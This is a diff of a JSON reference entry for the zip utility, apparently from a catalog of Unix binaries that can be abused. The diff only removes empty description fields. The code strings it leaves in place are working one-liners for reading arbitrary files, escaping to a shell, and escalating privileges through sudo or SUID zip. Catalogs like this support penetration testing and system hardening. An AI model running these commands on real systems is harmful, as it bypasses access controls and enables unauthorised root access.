@@ -2,25 +2,25 @@
   "functions": {
     "file-read": [
       {
-        "description": "",
+        
         "code": "LFILE=file-to-read\nTF=$(mktemp -u)\nzip $TF $LFILE\nunzip -p $TF\n"
       }
     ],
     "shell": [
       {
-        "description": "",
+        
         "code": "TF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"
       }
     ]
